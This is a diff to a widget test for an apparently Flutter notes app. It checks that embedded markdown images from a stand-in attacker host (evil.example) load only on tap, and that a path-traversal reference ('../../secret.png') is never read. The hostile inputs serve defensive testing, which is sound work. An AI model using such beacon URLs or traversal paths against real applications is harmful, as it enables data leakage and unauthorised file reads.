@@ -1684,6 +1684,7 @@ void main() {
     final path = createNote(root, 'topic', 'Kitaplar', today: today);
     addEntry(path, 'See ![the chart](https://evil.example/p.png?q=notes)', today: today);
     addEntry(path, 'And ![a photo](../attachments/2026-10-18/photo.png)', today: today);
+    addEntry(path, 'Not ![outside](../../secret.png)', today: today);
     File(p.join(root, 'attachments', '2026-10-18', 'photo.png'))
       ..parent.createSync(recursive: true)
       ..writeAsBytesSync([0]);
@@ -1697,6 +1698,9 @@ void main() {
     ]);
     expect(find.text('the chart'), findsOneWidget);
     expect(find.textContaining('evil.example'), findsOneWidget);
+    // One outside the notes folder is never read.
+    expect(find.text('outside'), findsOneWidget);
+    expect(find.text("Couldn't load"), findsOneWidget);
     // Only a tap fetches it.
     await tester.tap(find.textContaining('Tap to show'));
     await tester.pump();
